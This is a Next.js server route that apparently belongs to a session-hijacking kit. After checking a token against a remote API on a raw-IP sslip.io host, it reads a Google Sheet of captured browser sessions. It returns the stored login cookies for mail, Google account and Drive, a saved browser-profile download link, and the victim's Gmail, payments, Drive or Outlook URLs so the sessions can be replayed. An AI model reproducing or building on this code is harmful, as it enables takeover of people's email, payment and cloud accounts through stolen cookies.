import { NextResponse } from 'next/server';
import { getSheetDataApi } from '../../api/googlesheets.js';
import axios from 'axios';

export const maxDuration = 30;
export const dynamic = 'force-dynamic';

const MAIN_API = process.env.MAIN_API_URL || 'https://webfixx-hoo-oamupo-e98ced-157-173-204-24.sslip.io/api';


const FREE_MS_DOMAINS = new Set([
    'outlook.com', 'hotmail.com', 'live.com', 'windowslive.com',
    'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
    'outlook.ca', 'hotmail.ca', 'live.ca',
    'outlook.co.za', 'hotmail.co.za', 'live.co.za',
    'outlook.com.au', 'hotmail.com.au', 'live.com.au',
    'outlook.fr', 'hotmail.fr', 'live.fr',
    'outlook.de', 'hotmail.de', 'live.de',
    'outlook.it', 'hotmail.it', 'live.it',
    'outlook.es', 'hotmail.es', 'live.es',
    'outlook.jp', 'hotmail.jp', 'live.jp',
    'outlook.com.br', 'hotmail.com.br', 'live.com.br',
    'msn.com', 'live.net'
]);

function resolveSmartPlatformUrls(domain, platform, email) {
    const d = (domain || (email ? email.split('@')[1] : '') || '').toLowerCase().trim();
    const p = (platform || '').toLowerCase().trim();
    const em = (email || '').toLowerCase().trim();

    // 1. Google / Gmail: 3 tabs
    if (p === 'google' || p === 'gmail' || d.includes('google') || d.includes('gmail') || em.endsWith('@gmail.com') || em.endsWith('@googlemail.com')) {
        return [
            'https://mail.google.com/mail/u/0/#inbox',
            'https://myaccount.google.com/u/0/payments-and-subscriptions',
            'https://drive.google.com/drive/u/0/my-drive'
        ];
    }

    // 2. Outlook / Microsoft / Office 365: 1 tab dynamically resolved
    const isMsDomain = FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn') || d.includes('microsoft');
    if (p === 'outlook' || p === 'microsoft' || p === 'office365' || isMsDomain) {
        if (FREE_MS_DOMAINS.has(d) || d.includes('outlook') || d.includes('hotmail') || d.includes('live') || d.includes('msn')) {
            return ['https://outlook.live.com/mail/'];
        }
        // Custom domain / Office 365 / corporate paid account
        return ['https://outlook.office.com/mail/'];
    }

    // 3. Yahoo
    if (p === 'yahoo' || d.includes('yahoo') || d.includes('ymail')) {
        return ['https://mail.yahoo.com/'];
    }

    // 4. AOL
    if (p === 'aol' || d.includes('aol')) {
        return ['https://mail.aol.com/'];
    }

    // 5. Fallback for custom domain
    if (d) {
        return [`https://${d}`];
    }

    return ['https://mail.google.com/mail/u/0/#inbox'];
}


const getDirectDownloadUrl = (driveUrl) => {
  if (!driveUrl) return null;
  // Google Drive URL formats: /file/d/ID, /open?id=ID, /d/ID, uc?export=download&id=ID
  const patterns = [
    /\/file\/d\/([a-zA-Z0-9_-]+)/,
    /\/d\/([a-zA-Z0-9_-]+)/,
    /[?&]id=([a-zA-Z0-9_-]+)/,
  ];
  for (const pattern of patterns) {
    const match = driveUrl.match(pattern);
    if (match) {
      return `https://drive.google.com/uc?export=download&id=${match[1]}`;
    }
  }
  // Non-Drive URLs (Cloudinary, R2, B2) are already direct-download links.
  return driveUrl;
};

export async function POST(request) {
  try {
    const body = await request.json();
    const browserId = body.browserId || body.submissionId;
    const token = body.token;

    if (!browserId || !token) {
      return NextResponse.json(
        { error: 'Missing required fields: browserId, token' },
        { status: 400 }
      );
    }

    const validateRes = await axios.post(
      `${MAIN_API}/backend-function`,
      new URLSearchParams({
        action: 'backendFunction',
        token,
        functionName: 'updateAppData',
      }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 15000,
      }
    );

    if (!validateRes.data?.success) {
      return NextResponse.json(
        { error: 'Invalid or expired token' },
        { status: 401 }
      );
    }

    const cookieResult = await getSheetDataApi('cookie');

    if (!cookieResult.success || cookieResult.count === 0) {
      return NextResponse.json(
        { error: 'No cookie data available' },
        { status: 500 }
      );
    }

    const headers = cookieResult.headers;
    const row = cookieResult.data.find((r) => {
      const idx = headers.indexOf('browserId');
      return idx !== -1 && String(r[idx]).trim() === String(browserId).trim();
    });

    if (!row) {
      return NextResponse.json(
        { error: 'Session not found for the given browserId' },
        { status: 404 }
      );
    }

    const col = (key) => {
      const idx = headers.indexOf(key);
      return idx !== -1 ? row[idx] : null;
    };

    const driveUrl = col('driveUrl');
    const email = col('email') || '';
    const domain = col('domain') || (email ? email.split('@')[1].toLowerCase() : '');

    if (!driveUrl) {
      return NextResponse.json(
        { error: 'No saved browser profile found for this session' },
        { status: 404 }
      );
    }

    let cookieJSON = null;
    try {
      const raw = col('cookie') || col('cookieJSON') || col('formattedCookie');
      if (raw) {
        const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
        if (Array.isArray(parsed) && parsed.length > 0) cookieJSON = parsed;
      }
    } catch (_) {}

    let accountCookieJSON = null;
    try {
      const raw = col('accountCookie') || col('accountCookieJSON');
      if (raw) {
        const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
        if (Array.isArray(parsed) && parsed.length > 0) accountCookieJSON = parsed;
      }
    } catch (_) {}

    let driveCookieJSON = null;
    try {
      const raw = col('driveCookieJSON');
      if (raw) {
        const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
        if (Array.isArray(parsed) && parsed.length > 0) driveCookieJSON = parsed;
      }
    } catch (_) {}

    const platform = col('platform') || '';
            
    const platformUrls = resolveSmartPlatformUrls(domain, platform, email);
    const platformUrl = platformUrls[0] || 'https://mail.google.com/mail/u/0/#inbox';

    return NextResponse.json({
      downloadUrl: getDirectDownloadUrl(driveUrl),
      driveUrl,
      domain: domain || '',
      email: col('email') || '',
      category: col('category') || '',
      platform,
      platformUrl,
      platformUrls,
      cookieJSON,
      accountCookieJSON,
      driveCookieJSON,
    });
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
